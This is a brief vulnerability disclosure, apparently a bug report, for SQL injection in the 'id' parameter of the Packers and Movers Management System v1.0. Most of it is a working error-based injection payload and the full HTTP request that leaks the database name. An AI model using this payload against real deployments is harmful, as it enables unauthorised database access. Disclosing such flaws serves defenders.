# Packers and Movers Management System v1.0 by oretnom23 has SQL injection

BUG_Author: kirra

vendors: https://www.sourcecodester.com/php/15360/packers-and-movers-management-system-phpoop-free-source-code.html

Vulnerability File: /mpms/?p=services/view_service&id=

Vulnerability location: /mpms/?p=services/view_service&id=, id

[+] Payload: /mpms/?p=services/view_service&id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

```sql
GET /mpms/?p=services/view_service&id=2%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=c01he3spaa8msq4609rs8bml47
Connection: close
```
![image](https://github.com/kirra-max/bug_reports/assets/56863251/b7eac53c-4407-4ddc-92fe-6c4c470d2d2b)
